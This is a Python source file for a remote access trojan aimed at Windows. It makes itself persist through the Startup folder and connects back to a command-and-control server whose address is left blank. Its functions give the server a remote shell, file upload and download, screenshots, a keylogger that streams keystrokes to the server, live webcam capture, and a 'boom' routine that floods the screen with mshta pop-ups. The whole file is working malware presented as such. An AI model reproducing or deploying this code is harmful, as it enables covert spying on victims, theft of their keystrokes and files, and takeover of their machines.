import cv2
import pyautogui
import json
import socket
import queue
import time
import shutil
import os
import sys
import subprocess
import threading
from pynput import keyboard

CCIP = ""  # C2 SERVER IP
CCPORT =   # C2 SERVER PORT

# packing


# autorun function that makes the program initiate with windows
def autorun():
    try:
        file_name = os.path.basename(__file__)
        exe_file = file_name.replace(".py", ".exe")
        startup = os.path.join(os.getenv('APPDATA'), 'Microsoft',
                               'Windows', 'Start Menu', 'Programs', 'Startup', exe_file)
        shutil.copy(exe_file, startup)
    except Exception as e:
        print(f"Error: {e}")


def data_send(data, client):
    try:
        jsondata = json.dumps(data)
        client.sendall(jsondata.encode('latin-1'))
    except Exception as e:
        print(f"Error sending data: {e}")


def data_recv(client, timeout=120):
    data = ''
    client.settimeout(timeout)
    while True:
        try:
            chunk = client.recv(4096).decode('latin-1')
            if not chunk:
                print("No data received")
                break
            data += chunk
            try:
                return json.loads(data)
            except ValueError:
                continue
        except socket.timeout:
            continue
    return data


def download_file(file, client):
    data = b''
    try:
        with open(file, 'wb') as f:
            client.settimeout(10)
            while True:
                chunk = client.recv(4096)
                if not chunk:
                    break
                data += chunk
                f.write(chunk)
    except socket.timeout:
        print("Timed out")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.settimeout(None)


def upload_file(file, client):
    try:
        with open(file, 'rb') as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                client.sendall(chunk)
        print(f"{file} uploaded")
    except Exception as e:
        print(f"Error uploading file: {e}")


def screenshot(client):
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save('screenshot.png')
        upload_file('screenshot.png', client)
    except Exception as e:
        print(f"Error: {e}")
    finally:
        if os.path.exists('screenshot.png'):
            os.remove('screenshot.png')


def boom():
    commands = [
        'mshta "javascript:for (var i = 0; i < 10; i++) { alert(\'HACKED!!! HACKED!!! HACKED!!! HACKED!!!\'); } window.close();"',
        'mshta "javascript:for (var i = 0; i < 10000000; i++) { window.open(\'\',\'Window\' + i,\'width=1280,height=720\').document.write(\'<h1>HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHHA!</h1>\'); }"'
    ]

    for command in commands:
        try:
            subprocess.run(command, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(f"Error: {e}")


def keylogger_start(client):

    key_queue = queue.Queue()

    def on_press(key):
        try:
            key_char = f'>> {key.char} \n '
        except AttributeError:
            key_char = f' "{key}" '

        key_queue.put(key_char)

    def handle_keylogger():
        buffer = []
        while True:
            try:
                if not key_queue.empty():
                    while not key_queue.empty():
                        buffer.append(key_queue.get())

                    if len(buffer) >= 80:
                        data_send(''.join(buffer), client)
                        buffer.clear()

                time.sleep(1)
            except Exception as e:
                print(f"Error in keylogger: {e}")

    listener = keyboard.Listener(on_press=on_press)
    listener_thread = threading.Thread(target=listener.start, daemon=True)
    listener_thread.start()

    buffer_thread = threading.Thread(target=handle_keylogger, daemon=True)
    buffer_thread.start()


def capture_cam(client):
    print("Capturing webcam...")
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Webcam was not found")
        client.sendall(b"Webcam was not found")
        return

    try:
        while True:
            ret, frame = cap.read()
            if not ret:
                print("Can't receive frame")
                break
            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
            result, img_encoded = cv2.imencode('.jpg', frame, encode_param)
            if not result:
                print("Failed to encode")
                continue

            data = img_encoded.tobytes()
            client.sendall(len(data).to_bytes(4, 'big'))
            client.sendall(data)

            time.sleep(0.2)

    except Exception as e:
        print(f"Error capturing webcam: {e}")
    finally:
        cap.release()
        cv2.destroyAllWindows()


def cmd(command, client):
    try:
        exe = subprocess.Popen(
            command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
        )
        output, err = exe.communicate()

        comm = output + err + b'\n'

        comm_str = comm.decode('latin-1')

        data_send(comm_str, client)
    except Exception:
        pass


def shell(client):
    while True:
        try:
            comm = data_recv(client)
            if comm == '/exit':
                return
            elif comm == 'clear':
                pass
            elif comm[:3] == 'cd ':
                os.chdir(comm[3:])
            elif comm[:6] == 'upload':
                download_file(comm[7:], client)
            elif comm[:8] == 'download':
                upload_file(comm[9:], client)
            elif comm[:10] == 'screenshot':
                screenshot(client)
            elif comm[:10] == 'keylogger':
                print("Keylogger started")
                keylogger_thread = threading.Thread(
                    target=keylogger_start, args=(client,), daemon=True)
                keylogger_thread.start()
            elif comm[:6] == 'webcam':
                capture_cam(client)
            elif comm[:4] == 'boom':
                boom()
            elif comm == 'help':
                pass
            else:
                threading.Thread(target=cmd, args=(comm, client)).start()
        except KeyboardInterrupt:
            conn(CCIP, CCPORT)


def conn(ccip, ccport):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((ccip, ccport))
        return client
    except Exception as e:
        print(f"Error: {e}")


if __name__ == "__main__":
    autorun()
    while True:
        client = conn(CCIP, CCPORT)
        if client:
            try:
                shell(client)
            except Exception:
                pass
            finally:
                client.close()
        else:
            time.sleep(3)
